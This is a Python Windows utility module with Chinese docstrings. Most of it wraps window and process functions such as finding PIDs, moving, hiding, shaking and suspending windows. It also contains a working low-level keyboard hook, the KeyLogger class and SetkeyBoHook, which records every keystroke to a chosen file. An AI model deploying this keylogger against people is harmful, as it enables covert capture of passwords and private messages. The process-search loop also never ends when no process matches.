from .ModLib import WINDOWS_LIBRARY
from .const import (
    WH_KEYBOARD_LL,
    WM_KEYDOWN
)
from .Struct import PROCESSENTRY32, RECT
import ctypes as _ctype
import ctypes.wintypes
from ctypes.wintypes import MSG
from time import sleep


init_Library = WINDOWS_LIBRARY()
def FindProcessPid(ProcessName):
    '''
    :func: 通过名称取进程id
    :param ProcessName: 进程名称
    :return: 整数
    '''
    mod32 = PROCESSENTRY32()
    mod32.dwSize = _ctype.sizeof(PROCESSENTRY32)
    hProcessSnap = init_Library.createToolhelp32(2, 0)
    rest = init_Library.process32First(hProcessSnap, _ctype.pointer(mod32))
    if rest:
        while True:
            init_Library.process32Next(hProcessSnap, _ctype.pointer(mod32))
            if mod32.ProcessName.decode('gbk') == ProcessName:
                return mod32.th32ProcessID
    else:
        return 'The process could not be found.'

def FindWindowPid(className, windowName):
    '''
    :func: 通过窗口取进程id
    :param className: 类名称
    :param windowName: 窗口名称
    :return: 列表 [窗口句柄, 线程id, 进程id]
    '''
    hwnd = init_Library.findWindow(className, windowName)
    pid = ctypes.wintypes.DWORD()
    thre = init_Library.getThreadProcessId(hwnd, _ctype.byref(pid))
    return (hwnd, thre, pid.value)

def SendMessage(hwnd, Msg, wParam, IParam):
    '''
    :func: 指定窗口发送消息
    :param hwnd: 窗口句柄
    :param Msg: 发送的消息
    :param wParam: 附加的消息特定信息
    :param IParam: 附加的消息特定信息
    :return:
    '''
    return init_Library.sendMessage(hwnd, Msg, wParam, IParam)


def MonitorHotkeys(hotkey):
    '''
    :func: 监听热键
    :param hotkey: 键代码
    :return: 逻辑型
    '''
    return init_Library.getAsyncKeyState(hotkey)

def ShowWindowAsync(hwnd, bools):
    '''
    :func: 指定窗口显示隐藏
    :param hwnd: 窗口句柄
    :param bools: True = 显示 , False = 隐藏
    :return:
    '''
    init_Library.showWindowAsync(hwnd, bools)


def SetkeyBoHook(path):
    '''
    :func: 设置键盘钩子记录按键按下
    :param path: 记录的路径 自定义 如:( C:\logo.txt)
    :return: 字符
    '''
    global keyLogger
    keyLogger = KeyLogger(path)
    pointer = keyLogger.getFPTR(keyLogger.hookProc)
    keyLogger.installHookProc(pointer)
    keyLogger.startKeyLog()


def GetWindRect(hwnd):
    '''
    :func: 取窗口矩形
    :param hwnd: 窗口句柄
    :return: 整数
    '''
    initRECT = RECT()
    init_Library.getWindowRect(hwnd, _ctype.pointer(initRECT))
    return (initRECT.Left, initRECT.Top,
        initRECT.Right, initRECT.Bottom
    )

def MoveWindow(hwnd, x, y, newWhidth, nHeight):
    '''
    :func: 指定窗口移动位置
    :param hwnd: 窗口句柄
    :param x: x坐标
    :param y: y坐标
    :param newWhidth: 新宽度
    :param nHeight: 新高度
    :return: 逻辑
    '''
    return init_Library.moveWindow(hwnd, x, y, newWhidth, nHeight, True)

def CloseWindow(hwnd):
    '''
    :func: 关闭窗口到任务栏
    :param hwnd: 窗口句柄
    :return: 逻辑
    '''
    return init_Library.closeWindow(hwnd)

def IsWindowVisible(hwnd):
    '''
    :func: 窗口是否可见
    :param hwnd: 窗口句柄
    :return: 逻辑
    '''
    return init_Library.isWindowVisible(hwnd)

def UpdateWindow(hwnd):
    '''
    :func: 强制立即更新窗口
    :param hwnd: 窗口句柄
    :return: 逻辑
    '''
    return init_Library.updateWindow(hwnd)


def WindowShake(hwnd, shaken, shakes):
    '''
    :func: 指定窗口抖动
    :param hwnd: 窗口句柄
    :param shaken: 抖动次数
    :param shakes: 抖动速度 建议 0.02
    :return:
    '''
    Left, Top, Right, Bottom = GetWindRect(hwnd)
    for _ in range(shaken):
        MoveWindow(hwnd, Left - 3, Top - 3, Right - Left, Bottom - Top)
        sleep(shakes)
        MoveWindow(hwnd, Left - 5, Top,  Right - Left, Bottom - Top)
        sleep(shakes)
        MoveWindow(hwnd, Left - 3, Top + 3,  Right - Left, Bottom - Top)
        sleep(shakes)
        MoveWindow(hwnd, Left, Top + 5, Right - Left, Bottom - Top)
        sleep(shakes)
        MoveWindow(hwnd, Left + 3, Top + 3 , Right - Left, Bottom - Top)
        sleep(shakes)
        MoveWindow(hwnd, Left + 5, Top , Right - Left, Bottom - Top)
        sleep(shakes)
        MoveWindow(hwnd, Left + 3, Top - 3, Right - Left, Bottom - Top)
        sleep(shakes)
        MoveWindow(hwnd, Left, Top - 5, Right - Left, Bottom - Top)
    MoveWindow(hwnd, Left, Top , Right - Left, Bottom - Top)

def WindPending(hwnd, bools):
    '''
    :func: 指定窗口挂起
    :param hwnd: 窗口句柄
    :param bools: True 挂起 False 恢复
    :return:
    '''
    threId = init_Library.getThreadProcessId(hwnd, 0)
    if threId != 0:
        threId = init_Library.openThread(2032639, 0, threId)
        if bools:
            init_Library.suspendThread(threId)
        else:
            init_Library.resumeThread(threId)



keyLogger = ''
Content = ''
class KeyLogger():
    def __init__(self, path):
        self.hooked = None
        self.path = path

    def installHookProc(self, pointer):
        self.hooked = init_Library.setWindowsHookEx(
            WH_KEYBOARD_LL, pointer, init_Library.getModuleHandle(None),0)
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if self.hooked is None:
            return
        init_Library.unhookWindowsHookEx(self.hooked)
        self.hooked = None

    def getFPTR(self, fn):
        CMPFUNC = _ctype.CFUNCTYPE(_ctype.c_int, _ctype.c_int,
                  _ctype.c_int, _ctype.POINTER(_ctype.c_void_p))
        return CMPFUNC(fn)

    def hookProc(self, nCode, wParam, lParam):
        global Content
        if wParam is not WM_KEYDOWN:
            return init_Library.callNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
        hookedKey = chr(0xFFFFFFFF & lParam[0]).lower()
        with open('%s' % self.path , 'w', encoding='utf-8') as file:
            Content = Content + hookedKey
            file.writelines(Content)
        print(hookedKey, end='')
        return init_Library.callNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

    def startKeyLog(self):
        msg = MSG()
        init_Library.getMessageA(_ctype.byref(msg), 0, 0, 0)